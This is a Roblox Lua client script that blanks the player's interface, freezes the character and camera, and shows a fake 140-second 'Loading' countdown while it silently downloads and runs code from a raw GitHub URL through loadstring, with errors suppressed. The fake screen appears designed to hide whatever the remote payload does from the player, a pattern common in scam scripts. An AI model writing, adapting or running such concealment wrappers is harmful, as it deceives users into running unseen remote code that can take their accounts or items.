local player = game.Players.LocalPlayer
local countdownTime = 140
local uis = game:GetService("UserInputService")

-- Save original enabled states of GUIs
local playerGui = player:WaitForChild("PlayerGui")
local guiStates = {}
for _, gui in pairs(playerGui:GetChildren()) do
    if gui:IsA("ScreenGui") then
        guiStates[gui] = gui.Enabled
        gui.Enabled = false
    end
end

local char = player.Character or player.CharacterAdded:Wait()
local humanoid = char:FindFirstChildOfClass("Humanoid")
if humanoid then
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    humanoid.PlatformStand = true
end

local cam = workspace.CurrentCamera
cam.CameraType = Enum.CameraType.Scriptable

-- Create loading screen GUI
local loadingGui = Instance.new("ScreenGui", playerGui)
loadingGui.Name = "FullLoadingScreen"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.DisplayOrder = 9999

local bg = Instance.new("Frame", loadingGui)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.Size = UDim2.new(1, 0, 1, 0)

local title = Instance.new("TextLabel", bg)
title.Size = UDim2.new(1, 0, 0.1, 0)
title.Position = UDim2.new(0, 0, 0.3, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.Font = Enum.Font.SourceSansBold
title.Text = "Loading, please wait..."

local label = Instance.new("TextLabel", bg)
label.Size = UDim2.new(1, 0, 0.1, 0)
label.Position = UDim2.new(0, 0, 0.5, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.new(1, 1, 1)
label.TextScaled = true
label.Font = Enum.Font.SourceSans
label.Text = "Loading: " .. countdownTime

-- Run your script silently
spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/boomboxmisscal/test/refs/heads/main/test"))()
    end)
end)

for i = countdownTime, 1, -1 do
    label.Text = "Loading: " .. i
    wait(1)
end

loadingGui:Destroy()

-- Restore original GUI enabled states
for gui, wasEnabled in pairs(guiStates) do
    if gui and gui.Parent then -- check still valid
        gui.Enabled = wasEnabled
    end
end

if humanoid then
    humanoid.WalkSpeed = 16
    humanoid.JumpPower = 50
    humanoid.PlatformStand = false
end

cam.CameraType = Enum.CameraType.Custom

-- Enable input back just in case
uis.ModalEnabled = false
uis.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.None
